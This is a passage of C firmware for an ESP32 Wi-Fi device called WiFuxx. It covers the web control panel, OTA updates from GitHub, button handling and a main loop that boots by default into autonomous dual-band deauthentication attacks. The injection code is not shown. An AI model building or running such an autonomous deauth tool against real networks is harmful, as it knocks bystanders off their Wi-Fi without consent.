        { .uri = "/",             .method = HTTP_GET,  .handler = root_get_handler    },
        { .uri = "/favicon.ico",  .method = HTTP_GET,  .handler = favicon_get_handler },
        { .uri = "/scan",         .method = HTTP_GET,  .handler = scan_get_handler    },
        { .uri = "/attack",       .method = HTTP_POST, .handler = attack_post_handler },
        { .uri = "/config",       .method = HTTP_GET,  .handler = config_get_handler  },
        { .uri = "/config",       .method = HTTP_POST, .handler = config_post_handler },
        { .uri = "/config/reset", .method = HTTP_POST, .handler = config_reset_handler },
        { .uri = "/auto",         .method = HTTP_POST, .handler = auto_post_handler },
        { .uri = "/update",       .method = HTTP_POST, .handler = update_post_handler },
    };
    for (int i = 0; i < (int)(sizeof(uris) / sizeof(uris[0])); i++)
        httpd_register_uri_handler(http_server, &uris[i]);

    ESP_LOGI(TAG, "WebUI HTTP server running at http://%s", WEBUI_AP_IP);
}

// ==================== WebUI: mDNS (wifuxx.local) ====================
// Lets phones reach the panel by name as well as by IP. Note: iOS/macOS resolve
// .local out of the box; many Android browsers still need the raw IP, so the
// connect screen keeps showing 192.168.42.42 too.
static void mdns_webui_start(void) {
    if (mdns_init() != ESP_OK) {
        ESP_LOGW(TAG, "mDNS init failed — use http://%s", WEBUI_AP_IP);
        return;
    }
    mdns_hostname_set(WEBUI_MDNS_HOST);
    mdns_instance_name_set("WiFuxx Control");
    mdns_service_add(NULL, "_http", "_tcp", 80, NULL, 0);
    ESP_LOGI(TAG, "mDNS up: http://%s.local (or http://%s)", WEBUI_MDNS_HOST, WEBUI_AP_IP);
}

// ==================== WebUI: Wi-Fi (AP for phone + STA so /scan works) ====================
static void wifi_init_apsta_webui(void) {
    led_state = LED_STATE_WIFI_INIT;
    esp_netif_init();
    esp_event_loop_create_default();
    esp_netif_create_default_wifi_sta();
    esp_netif_t *ap_netif = esp_netif_create_default_wifi_ap();

    // Static IP on the AP netif: stop DHCP server, assign, restart it.
    esp_netif_ip_info_t ip_info = {0};
    ip_info.ip.addr      = esp_ip4addr_aton(WEBUI_AP_IP);
    ip_info.gw.addr      = esp_ip4addr_aton(WEBUI_AP_IP);
    ip_info.netmask.addr = esp_ip4addr_aton("255.255.255.0");
    esp_netif_dhcps_stop(ap_netif);
    esp_netif_set_ip_info(ap_netif, &ip_info);
    esp_netif_dhcps_start(ap_netif);

    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    wifi_check(esp_wifi_init(&cfg), "esp_wifi_init");
    wifi_check(esp_wifi_set_mode(WIFI_MODE_APSTA), "esp_wifi_set_mode");

    wifi_config_t ap_config = {
        .ap = {
            .password        = "",
            .max_connection  = WEBUI_AP_MAX_CONN,
            .authmode        = WIFI_AUTH_OPEN,
            .beacon_interval = 100,
        },
    };
    // SSID and channel come from user settings (NVS), applied at boot.
    size_t ssid_len = strnlen(g_settings.ap_ssid, sizeof(g_settings.ap_ssid));
    if (ssid_len >= sizeof(ap_config.ap.ssid)) ssid_len = sizeof(ap_config.ap.ssid) - 1;
    memcpy(ap_config.ap.ssid, g_settings.ap_ssid, ssid_len);
    ap_config.ap.ssid[ssid_len] = '\0';
    ap_config.ap.ssid_len = ssid_len;
    ap_config.ap.channel  = g_settings.ap_channel;
    wifi_check(esp_wifi_set_config(WIFI_IF_AP, &ap_config), "esp_wifi_set_config(AP)");
    wifi_check(esp_wifi_start(), "esp_wifi_start");
    // No promiscuous mode in WebUI — raw deauth injection only runs in ATTACK boot.

    ESP_LOGI(TAG, "WebUI SoftAP '%s' (ch %d) up; open http://%s",
             g_settings.ap_ssid, g_settings.ap_channel, WEBUI_AP_IP);
}

// ==================== BOOT Button: hold to enter WebUI ====================
// ATTACK boot only. A clean continuous 2s LOW on GPIO28 reboots into WebUI mode.
static void button_task(void *pvParameters) {
    gpio_config_t io = {
        .pin_bit_mask = 1ULL << BOOT_BUTTON_GPIO,
        .mode         = GPIO_MODE_INPUT,
        .pull_up_en   = GPIO_PULLUP_ENABLE,
        .pull_down_en = GPIO_PULLDOWN_DISABLE,
        .intr_type    = GPIO_INTR_DISABLE,
    };
    gpio_config(&io);

    int last = gpio_get_level(BOOT_BUTTON_GPIO);
    ESP_LOGI(TAG, "button_task watching GPIO%d (idle=%d; a press should read 0). Hold 2s for WebUI.",
             BOOT_BUTTON_GPIO, last);

    uint32_t held_ms = 0;
    while (1) {
        int level = gpio_get_level(BOOT_BUTTON_GPIO);
        if (level != last) {            // log every edge so the pin's wiring is visible on serial
            ESP_LOGW(TAG, "GPIO%d -> %s", BOOT_BUTTON_GPIO,
                     level == 0 ? "LOW (pressed)" : "HIGH (released)");
            last = level;
        }
        if (level == 0) {               // active LOW = pressed
            held_ms += BUTTON_POLL_MS;
            if (held_ms >= BUTTON_HOLD_MS) {
                ESP_LOGW(TAG, "BOOT held %lums -> entering WebUI", (unsigned long)held_ms);
                reboot_into(BOOT_MODE_WEBUI);
            }
        } else {
            held_ms = 0;   // released before 2s — reset, require a clean hold
        }
        vTaskDelay(pdMS_TO_TICKS(BUTTON_POLL_MS));
    }
}

// ==================== BOOT Button: hold to factory-reset (WebUI mode) ====================
// WebUI boot only. The button does nothing else here, so a long 10s hold is a
// safe "lockout escape": if a user sets a WebUI password and forgets it, holding
// BOOT wipes settings (incl. auth) back to defaults and reboots into a fresh,
// open WebUI. Does not affect the 2s hold-to-enter-WebUI in ATTACK mode.
static void webui_button_task(void *pvParameters) {
    gpio_config_t io = {
        .pin_bit_mask = 1ULL << BOOT_BUTTON_GPIO,
        .mode         = GPIO_MODE_INPUT,
        .pull_up_en   = GPIO_PULLUP_ENABLE,
        .pull_down_en = GPIO_PULLDOWN_DISABLE,
        .intr_type    = GPIO_INTR_DISABLE,
    };
    gpio_config(&io);

    ESP_LOGI(TAG, "webui_button_task watching GPIO%d — hold %ds to factory-reset.",
             BOOT_BUTTON_GPIO, BUTTON_RESET_HOLD_MS / 1000);

    uint32_t held_ms = 0;
    while (1) {
        if (gpio_get_level(BOOT_BUTTON_GPIO) == 0) {   // active LOW = pressed
            held_ms += BUTTON_POLL_MS;
            if (held_ms >= BUTTON_RESET_HOLD_MS) {
                ESP_LOGW(TAG, "BOOT held %lums in WebUI -> FACTORY RESET", (unsigned long)held_ms);
                settings_reset();
                g_webui_resetting = true;            // status_log_task announces it
                vTaskDelay(pdMS_TO_TICKS(2500));     // let the user read it
                reboot_into(BOOT_MODE_WEBUI);        // come back up fresh + open
            }
        } else {
            held_ms = 0;   // released — require a clean continuous hold
        }
        vTaskDelay(pdMS_TO_TICKS(BUTTON_POLL_MS));
    }
}

// ==================== Boot Splash (serial) ====================
// Prints monitor_bitmap (80x80) as ASCII art to the serial monitor
static void log_boot_splash(void) {
    char row[81];
    for (int r = 0; r < 40; r++) {
        for (int i = 0; i < 80; i++) {
            row[i] = (monitor_bitmap[r * 10 + i / 8] & (0x80 >> (i % 8))) ? '#' : ' ';
        }
        row[80] = '\0';
        ESP_LOGI(TAG, "%s", row);
    }
}

// ==================== OTA Update Mode ====================
// Entered by rebooting into BOOT_MODE_OTA (from the WebUI "Update" card). Joins the
// saved home AP as a station, asks the GitHub API for the latest release tag, and if
// it's newer than fw_version() streams the release .bin into the inactive OTA slot
// via esp_https_ota. All feedback is on the serial console — the phone is
// disconnected the moment we leave the SoftAP, so there is no live WebUI here by
// design. The onboard LED also tracks stages (magenta/cyan/red breath).

// One serial status line under a fixed ">> OTA UPDATE" prefix.
static void ota_show(const char *l1, const char *l2, const char *l3) {
    ESP_LOGI(TAG, ">> OTA UPDATE: %s %s %s",
             l1 ? l1 : "", l2 ? l2 : "", l3 ? l3 : "");
}

// esp_https_ota progress -> log each new percent.
static void ota_progress(int pct) {
    ESP_LOGI(TAG, "OTA writing %d%%", pct);
}

// ---- STA connect to the home AP (event-group handshake) ----
static EventGroupHandle_t s_ota_wifi_events;
#define OTA_WIFI_CONNECTED_BIT BIT0
#define OTA_WIFI_FAIL_BIT      BIT1
static int s_ota_wifi_retry = 0;

static void ota_wifi_event_handler(void *arg, esp_event_base_t base,
                                   int32_t id, void *data) {
    if (base == WIFI_EVENT && id == WIFI_EVENT_STA_START) {
        esp_wifi_connect();
    } else if (base == WIFI_EVENT && id == WIFI_EVENT_STA_DISCONNECTED) {
        if (s_ota_wifi_retry < OTA_WIFI_MAX_RETRY) {
            s_ota_wifi_retry++;
            ESP_LOGW(TAG, "OTA STA disconnected, retry %d/%d", s_ota_wifi_retry, OTA_WIFI_MAX_RETRY);
            esp_wifi_connect();
        } else {
            xEventGroupSetBits(s_ota_wifi_events, OTA_WIFI_FAIL_BIT);
        }
    } else if (base == IP_EVENT && id == IP_EVENT_STA_GOT_IP) {
        s_ota_wifi_retry = 0;
        xEventGroupSetBits(s_ota_wifi_events, OTA_WIFI_CONNECTED_BIT);
    }
}

static bool ota_wifi_connect(const char *ssid, const char *pass) {
    s_ota_wifi_events = xEventGroupCreate();
    if (!s_ota_wifi_events) return false;

    esp_netif_init();
    esp_event_loop_create_default();
    esp_netif_create_default_wifi_sta();

    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    wifi_check(esp_wifi_init(&cfg), "esp_wifi_init");
    esp_event_handler_instance_register(WIFI_EVENT, ESP_EVENT_ANY_ID,
                                        ota_wifi_event_handler, NULL, NULL);
    esp_event_handler_instance_register(IP_EVENT, IP_EVENT_STA_GOT_IP,
                                        ota_wifi_event_handler, NULL, NULL);

    wifi_config_t wc = {0};   // zero-init leaves a NUL terminator after each copy
    size_t sl = strnlen(ssid, sizeof(wc.sta.ssid) - 1);
    size_t pl = strnlen(pass, sizeof(wc.sta.password) - 1);
    memcpy(wc.sta.ssid, ssid, sl);
    memcpy(wc.sta.password, pass, pl);
    wifi_check(esp_wifi_set_mode(WIFI_MODE_STA), "esp_wifi_set_mode(STA)");
    wifi_check(esp_wifi_set_config(WIFI_IF_STA, &wc), "esp_wifi_set_config(STA)");
    wifi_check(esp_wifi_start(), "esp_wifi_start");

    EventBits_t bits = xEventGroupWaitBits(
        s_ota_wifi_events, OTA_WIFI_CONNECTED_BIT | OTA_WIFI_FAIL_BIT,
        pdFALSE, pdFALSE, pdMS_TO_TICKS(OTA_WIFI_TIMEOUT_MS));
    return (bits & OTA_WIFI_CONNECTED_BIT) != 0;
}

// ---- GitHub: latest release tag ----
// GET /releases/latest and pull "tag_name" out of the JSON. tag_name is emitted
// early (before the long release body/assets), so a small buffer captures it even
// though the full response is larger. Manual substring scan keeps us robust to the
// body being truncated by the fixed read window.
static bool github_latest_tag(char *tag_out, size_t tag_sz) {
    char url[160];
    snprintf(url, sizeof(url),
             "https://api.github.com/repos/%s/%s/releases/latest",
             OTA_GITHUB_OWNER, OTA_GITHUB_REPO);

    esp_http_client_config_t cfg = {
        .url               = url,
        .crt_bundle_attach = esp_crt_bundle_attach,
        .timeout_ms        = 10000,
        .keep_alive_enable = true,
    };
    esp_http_client_handle_t c = esp_http_client_init(&cfg);
    if (!c) return false;
    esp_http_client_set_header(c, "User-Agent", "WiFuxx-OTA");  // GitHub 403s without a UA
    esp_http_client_set_header(c, "Accept", "application/vnd.github+json");

    bool ok = false;
    if (esp_http_client_open(c, 0) == ESP_OK) {
        esp_http_client_fetch_headers(c);
        int status = esp_http_client_get_status_code(c);
        if (status == 200) {
            char buf[3072];
            int off = 0, r;
            while (off < (int)sizeof(buf) - 1 &&
                   (r = esp_http_client_read(c, buf + off, sizeof(buf) - 1 - off)) > 0)
                off += r;
            buf[off] = '\0';

            char *p = strstr(buf, "\"tag_name\"");
            if (p && (p = strchr(p, ':')) && (p = strchr(p, '"'))) {
                p++;
                char *e = strchr(p, '"');
                if (e && (size_t)(e - p) < tag_sz) {
                    memcpy(tag_out, p, e - p);
                    tag_out[e - p] = '\0';
                    ok = true;
                }
            }
            if (!ok) ESP_LOGE(TAG, "OTA: tag_name not found in GitHub response");
        } else {
            ESP_LOGE(TAG, "OTA: GitHub API HTTP %d", status);
        }
    } else {
        ESP_LOGE(TAG, "OTA: GitHub API connection failed");
    }
    esp_http_client_close(c);
    esp_http_client_cleanup(c);
    return ok;
}

// Add the User-Agent header on the OTA download client too (github.com is lenient
// but the redirect target is happier with one). Runs when esp_https_ota inits.
static esp_err_t ota_http_client_init_cb(esp_http_client_handle_t c) {
    esp_http_client_set_header(c, "User-Agent", "WiFuxx-OTA");
    return ESP_OK;
}

// Stream the release asset for `tag` into the inactive OTA slot, logging the %.
static bool ota_download_and_flash(const char *tag) {
    char url[256];
    snprintf(url, sizeof(url),
             "https://github.com/%s/%s/releases/download/%s/%s",
             OTA_GITHUB_OWNER, OTA_GITHUB_REPO, tag, OTA_ASSET_NAME);
    ESP_LOGI(TAG, "OTA: downloading %s", url);

    esp_http_client_config_t http_cfg = {
        .url               = url,
        .crt_bundle_attach = esp_crt_bundle_attach,
        .timeout_ms        = 20000,
        .keep_alive_enable = true,
        // GitHub redirects the download to an objects.githubusercontent.com URL whose
        // AWS-signed query string is ~1KB. The default 512B TX buffer can't hold the
        // "GET <signed-url> HTTP/1.1" request line -> esp_http_client logs "Out of
        // buffer" and esp_https_ota_begin fails. Give both buffers room for it.
        .buffer_size       = 2048,
        .buffer_size_tx    = 2048,
    };
    esp_https_ota_config_t ota_cfg = {
        .http_config         = &http_cfg,
        .http_client_init_cb = ota_http_client_init_cb,
    };

    esp_https_ota_handle_t h = NULL;
    if (esp_https_ota_begin(&ota_cfg, &h) != ESP_OK || !h) {
        ESP_LOGE(TAG, "OTA: esp_https_ota_begin failed");
        return false;
    }

    int total = esp_https_ota_get_image_size(h);
    int last_pct = -1;
    esp_err_t err;
    while ((err = esp_https_ota_perform(h)) == ESP_ERR_HTTPS_OTA_IN_PROGRESS) {
        int read = esp_https_ota_get_image_len_read(h);
        int pct = (total > 0) ? (read * 100 / total) : 0;
        if (pct != last_pct) { last_pct = pct; ota_progress(pct); }
    }

    bool ok = (err == ESP_OK) && esp_https_ota_is_complete_data_received(h);
    if (esp_https_ota_finish(h) != ESP_OK) ok = false;
    if (!ok) ESP_LOGE(TAG, "OTA: download/flash failed (err %s)", esp_err_to_name(err));
    return ok;
}

// The whole OTA flow. Never returns — every path reboots: success/up-to-date go to
// ATTACK, any failure goes to WEBUI so the user can fix creds and retry.
static void ota_mode_run(void) {
    if (g_settings.home_ssid[0] == '\0') {
        ota_show("No Wi-Fi saved", "Set it in the", "WebUI Update card");
        vTaskDelay(pdMS_TO_TICKS(4000));
        reboot_into(BOOT_MODE_WEBUI);
    }

    led_state = LED_STATE_WIFI_INIT;
    ota_show("Joining Wi-Fi:", g_settings.home_ssid, "connecting...");
    if (!ota_wifi_connect(g_settings.home_ssid, g_settings.home_pass)) {
        ota_show("Wi-Fi FAILED", "Check name/pass", "in WebUI, retry");
        vTaskDelay(pdMS_TO_TICKS(5000));
        reboot_into(BOOT_MODE_WEBUI);
    }

    led_state = LED_STATE_SCANNING;
    ota_show("Connected.", "Checking GitHub", "for updates...");
    char tag[32];
    if (!github_latest_tag(tag, sizeof(tag))) {
        ota_show("Check FAILED", "No internet?", "Retry via WebUI");
        vTaskDelay(pdMS_TO_TICKS(5000));
        reboot_into(BOOT_MODE_WEBUI);
    }

    const char *cur = fw_version();
    char l_cur[48], l_new[48];
    snprintf(l_cur, sizeof(l_cur), "have %s", cur);
    snprintf(l_new, sizeof(l_new), "new  %s", tag);
    ESP_LOGI(TAG, "OTA: current %s, latest %s", cur, tag);

    if (semver_cmp(tag, cur) <= 0) {
        ota_show("Up to date :)", l_cur, l_new);
        vTaskDelay(pdMS_TO_TICKS(6000));
        reboot_into(BOOT_MODE_ATTACK);
    }

    led_state = LED_STATE_ATTACKING;   // red breath = writing flash, "busy, don't unplug"
    ota_show("Updating!", l_new, "DO NOT UNPLUG");
    vTaskDelay(pdMS_TO_TICKS(1200));

    if (ota_download_and_flash(tag)) {
        ota_show("Update OK!", l_new, "rebooting...");
        vTaskDelay(pdMS_TO_TICKS(2500));
        reboot_into(BOOT_MODE_ATTACK);   // new slot is now the boot partition
    } else {
        ota_show("Update FAILED", "kept old fw", "Retry via WebUI");
        vTaskDelay(pdMS_TO_TICKS(5000));
        reboot_into(BOOT_MODE_WEBUI);
    }
}

static void ota_mode_task(void *pvParameters) {
    ota_mode_run();     // never returns (always reboots)
    vTaskDelete(NULL);
}

// ==================== Main ====================
void app_main(void) {
    boot_mode_init();   // pick ATTACK (default) or WEBUI from persisted RTC state

    // NVS up first so user settings (incl. skip_splash) are available before the
    // splash and before Wi-Fi/attack config reads any tunables.
    esp_err_t ret = nvs_flash_init();
    if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND) {
        ESP_ERROR_CHECK(nvs_flash_erase());
        ret = nvs_flash_init();
    }
    ESP_ERROR_CHECK(ret);
    settings_load();

    if (!g_settings.skip_splash) log_boot_splash();

    status_led_init();
    led_state = LED_STATE_BOOT;
    xTaskCreate(status_led_task, "status_led", 2048, NULL, 1, NULL);

    // Shared state for the attack/scan tasks and the serial status logger.
    display_mutex = xSemaphoreCreateMutex();
    if (!display_mutex)
        ESP_LOGE(TAG, "display_mutex create failed");

    if (g_boot_mode == BOOT_MODE_OTA) {
        // -------- OTA mode: STA -> home AP -> GitHub check -> flash inactive slot.
        // Runs in its own generous-stack task (TLS handshake + OTA is stack-heavy);
        // feedback is on the serial console + LED, so no status task here.
        // Never returns. --------
        xTaskCreate(ota_mode_task, "ota", 10240, NULL, 5, NULL);
        while (1) vTaskDelay(pdMS_TO_TICKS(10000));
    }

    if (g_boot_mode == BOOT_MODE_WEBUI) {
        // -------- WebUI mode: SoftAP + HTTP control panel, no attack --------
        g_webui_display = true;                       // status_log_task notes WebUI is up
        strcpy(current_display_info.status, "WEBUI");
        xTaskCreate(status_log_task, "status", 3072, NULL, 2, NULL);

        wifi_init_apsta_webui();
        led_state = LED_STATE_WEBUI_IDLE;             // rainbow breath
        http_server_start();
        mdns_webui_start();                           // http://wifuxx.local
        xTaskCreate(webui_button_task, "webui_btn", 2048, NULL, 3, NULL);  // hold BOOT 10s = factory reset

        ESP_LOGI(TAG, "WebUI mode ready — join '%s', open http://%s or http://%s.local",
                 g_settings.ap_ssid, WEBUI_AP_IP, WEBUI_MDNS_HOST);
    } else {
        // -------- Attack mode (default): autonomous dual-band deauth --------
        xTaskCreate(status_log_task, "status", 3072, NULL, 2, NULL);

        wifi_init_sta();
        xTaskCreate(button_task, "button", 2048, NULL, 3, NULL);
        xTaskCreate(autonomous_mode_task, "auto_mode", 8192, NULL, 5, NULL);
        ESP_LOGI(TAG, "Autonomous attack mode started (hold BOOT 2s for WebUI)");
    }

    while (1) vTaskDelay(pdMS_TO_TICKS(10000));
}
